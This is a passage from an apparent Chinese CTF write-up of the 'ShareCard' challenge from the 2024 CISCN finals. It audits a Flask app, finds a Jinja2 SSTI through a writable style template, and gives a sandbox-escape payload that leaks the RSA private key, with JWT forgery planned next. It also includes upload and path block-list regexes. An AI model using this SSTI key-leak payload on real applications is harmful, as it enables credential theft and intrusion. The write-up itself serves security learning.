            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .js files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传其他类型的文件</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/*...*/</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="ShareCard（break复现）"><a href="#ShareCard（break复现）" class="headerlink" title="ShareCard（break复现）"></a>ShareCard（break复现）</h2><blockquote>
<p>SSTI + 沙盒逃逸</p>
</blockquote>
<p>思路参考：nepnep战队的知识分享会 <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1gDv1eFEyN/">https://www.bilibili.com/video/BV1gDv1eFEyN/</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> current_app
<span class="token keyword">from</span> jinja2<span class="token punctuation">.</span>sandbox <span class="token keyword">import</span> SandboxedEnvironment
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">import</span> qrcode
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> json
<span class="token keyword">import</span> jwt
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">SaferSandboxedEnvironment</span><span class="token punctuation">(</span>SandboxedEnvironment<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">is_safe_attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> attr<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

    <span class="token keyword">def</span> <span class="token function">is_safe_callable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span>
    avatar<span class="token punctuation">:</span> <span class="token builtin">str</span>
    signature<span class="token punctuation">:</span> <span class="token builtin">str</span>
    <span class="token keyword">def</span> <span class="token function">parse_avatar</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>avatar <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'avatars/'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safer_render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    env <span class="token operator">=</span> SaferSandboxedEnvironment<span class="token punctuation">(</span>loader<span class="token operator">=</span>current_app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>loader<span class="token punctuation">)</span>
    <span class="token keyword">return</span> env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token operator">+</span>template_name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>
    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> FileNotFoundError
    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>
    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>
    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/showCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span>jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>get_default_algorithms<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    info <span class="token operator">=</span> Info<span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span>
    info<span class="token punctuation">.</span>parse_avatar<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"show.html"</span><span class="token punctuation">,</span> info<span class="token operator">=</span>info<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'create_card'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本地要调试的时候发现给的dist-packages会报错，实际有限制py版本</p>
<p>先在linux下起一个venv环境，注意要是python3.8的：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> venv <span class="token builtin class-name">test</span>
<span class="token builtin class-name">source</span> test/bin/activate
<span class="token comment">#pip3 install dist-packages.tar.gz</span>
<span class="token comment"># 上面这个用不了，缺少setup.py</span>
<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> dist-packages.tar.gz <span class="token parameter variable">-C</span> dist-packages
<span class="token function">cp</span> <span class="token parameter variable">-r</span> dist-packages/* test/lib/python3.8/site-packages/
<span class="token builtin class-name">cd</span> src
python app.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计代码</p>
<p>首先是 &#x2F;createCard 路由</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>
    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> FileNotFoundError
    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>
    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>
    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809170450021.png" alt="image-20240809170450021"></p>
<p>注意到这里可以写入文件：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>找一下这个 style.css 文件被导入的地方，在三个 html 里面都有</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809171936436.png" alt="image-20240809171936436"></p>
<p>以模板的形式包含文件来导入，然后会用<code>safer_render_template</code>进行渲染</p>
<p>我们尝试传入一下 style 参数打ssti看看</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809173222915.png" alt="image-20240809173222915"></p>
<p>确实存在ssti，但是不能直接payload一把梭，因为这里用的是自定义的<code>safer_render_template</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">safer_render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    env <span class="token operator">=</span> SaferSandboxedEnvironment<span class="token punctuation">(</span>loader<span class="token operator">=</span>current_app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>loader<span class="token punctuation">)</span>
    <span class="token keyword">return</span> env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token operator">+</span>template_name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到开了个沙盒</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SaferSandboxedEnvironment</span><span class="token punctuation">(</span>SandboxedEnvironment<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">is_safe_attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> attr<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>

    <span class="token keyword">def</span> <span class="token function">is_safe_callable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里设置成能够访问属性，但是不能调用，给沙盒拦了</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809173315191.png" alt="image-20240809173315191"></p>
<p>怎么办呢？继续审计代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span>
    avatar<span class="token punctuation">:</span> <span class="token builtin">str</span>
    signature<span class="token punctuation">:</span> <span class="token builtin">str</span>
    <span class="token keyword">def</span> <span class="token function">parse_avatar</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>avatar <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'avatars/'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>明显这里存在一个文件读取，看一下<code>parse_avatar</code>调用的位置：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/showCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span>jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>get_default_algorithms<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    info <span class="token operator">=</span> Info<span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span>
    info<span class="token punctuation">.</span>parse_avatar<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"show.html"</span><span class="token punctuation">,</span> info<span class="token operator">=</span>info<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 &#x2F;showCard 路由下</p>
<p>我们正常生成一个二维码之后点击二维码就可以跳转到 &#x2F;showcard 下，同时后面会跟一串token</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809174116052.png" alt="image-20240809174116052"></p>
<p>一眼jwt，解码一下看看</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809174228055.png" alt="image-20240809174228055"></p>
<p>相关的生成代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

	info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>
    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> FileNotFoundError
    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>
    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于<code>if info.avatar not in os.listdir(&#39;avatars&#39;)</code>的存在，导致我们不能直接在 avatar 参数上进行目录穿越</p>
<p>那么考虑 jwt 伪造 avatar 的值，但是这里jwt的key是rsa生成的，我们需要想办法得到 rsakey</p>
<p>这时候就又想到前面的 ssti 了，虽然不能直接调用，但是可以访问属性，我们可以利用这一点获取rsakey</p>
<p>现在想办法在沙盒内拿到一个全局属性，注意到<code>return safer_render_template(&quot;created.html&quot;, share_url=share_url, share_img=share_img)</code>，意味着我们可以用<code>share_url</code>或者<code>share_img</code>来获取属性，同理下面的<code>info</code>也可以</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809180407291.png" alt="image-20240809180407291"></p>
<p>这里的话要取 info 的属性，因为 info 是调用<code>Info</code>类得到的，Info类下有<code>parse_avatar</code>这个全局方法，然后需要在 &#x2F;showCard 路由下查看style，因为这里才有info，而 &#x2F;createCard 则会报错但没关系</p>
<p>那么读rsakey</p>
<pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter punctuation">&#123;&#123;</span><span class="token variable">info</span><span class="token punctuation">.</span><span class="token variable">__class__</span><span class="token punctuation">.</span><span class="token variable">parse_avatar</span><span class="token punctuation">.</span><span class="token variable">__globals__</span><span class="token punctuation">.</span><span class="token variable">rsakey</span><span class="token punctuation">.</span><span class="token variable">__dict__</span><span class="token delimiter punctuation">&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809181611924.png" alt="image-20240809181611924"></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>'_n'<span class="token operator">:</span> Integer(<span class="token number">126123614477015775448789877206017292386336663012480330606083697181136984617708780170725665068837288536687956308850816616924015665300736823691410985286499563938666378049277495278535134451022151639249605836868202071595881433292992822004089702149441937221323083043604617381139486807424885868287782232845765278943</span>)<span class="token punctuation">,</span>
'_e'<span class="token operator">:</span> Integer(<span class="token number">65537</span>)<span class="token punctuation">,</span>
'_d'<span class="token operator">:</span> Integer(<span class="token number">16356021780675909418180038243647725223789238124159945219053440687588434506704715239803430541832066088977385914352550321608209242708561000115252482779955744104485540020656221986885376506975459291207812710017083944289037938520247378083893059236195153243903078926446378766613488506330804090368443881290180527489</span>)<span class="token punctuation">,</span>
'_p'<span class="token operator">:</span> Integer(<span class="token number">9850363198422246262285117823658498388221798522562304025833696072510450569943633244157099881440406495235906124442860453293788140178008982726677547045673409</span>)<span class="token punctuation">,</span>
'_q'<span class="token operator">:</span> Integer(<span class="token number">12803955746242662857848752418436052334358986979076848017812570866767671055374254584876363536051804158817416040437466027033560595225841364508826493617684127</span>)<span class="token punctuation">,</span>
'_u'<span class="token operator">:</span> Integer(<span class="token number">10145018723854556278558667216207587332906644078393923017778188994804203848464400278734625183772210928560743734943678326043651170472880674685079284970854903</span>)<span class="token punctuation">,</span>
